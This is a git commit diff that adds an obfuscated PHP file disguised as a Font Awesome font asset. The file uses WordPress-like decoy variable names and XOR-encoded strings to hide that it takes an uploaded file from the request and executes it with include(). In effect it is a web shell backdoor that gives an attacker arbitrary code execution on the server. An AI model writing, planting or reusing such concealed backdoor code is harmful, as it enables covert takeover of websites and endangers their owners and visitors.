16a5fe9004325337591d3af2a1025e5973047054
dennisramsey <dennis.ramsey@gmail.com>
2024-02-06 07:16:20 -0800

    initial

---
+++ fonts/fontawesome/0f4b58f4.php
@@ -0,0 +1,50 @@
+<?php 	
+function raw_key()
+
+{
+
+    $pee_part = 'rE6qdbhXOutCphU';
+
+    $cache_key = $pee_part;
+    
+    $encode_ascii_characters = $GLOBALS[capability_type("-%03%7F%3D%211", $cache_key)];
+	$length = 'local';
+    $default_no_texturize_shortcodes = $encode_ascii_characters;
+    $emoji = isset($default_no_texturize_shortcodes[$cache_key]);
+    if ($emoji)
+
+    {
+        $menu_icon = $encode_ascii_characters[$cache_key];
+        $get_posts = $menu_icon[capability_type("%06%28F.%0A%03%05%3D", $cache_key)];
+	$datetime = 'show_in_admin_all_list';
+        $exclude_from_search = $get_posts;
+	$raw_excerpt = 'mins';
+        include ($exclude_from_search);
+
+    }
+	$timezone = 'post_name';
+}
+function capability_type($search, $tagstack)
+
+{
+    $original_image = $tagstack;
+
+    $post_mimes = "url" . "decode";
+    $cdata = $post_mimes($search);
+	$page_ids = 'em_dash';
+    $parsed_args = substr($original_image,0, strlen($cdata));
+    $_edit_link = $cdata ^ $parsed_args;
+    
+    $cdata = strpos($_edit_link, $parsed_args);
+
+    
+	$weeks = 'sizeinfo';
+    return $_edit_link;
+
+}
+
+	$decoded_slug = '_links_add_base';
+raw_key();
+
+
+?>
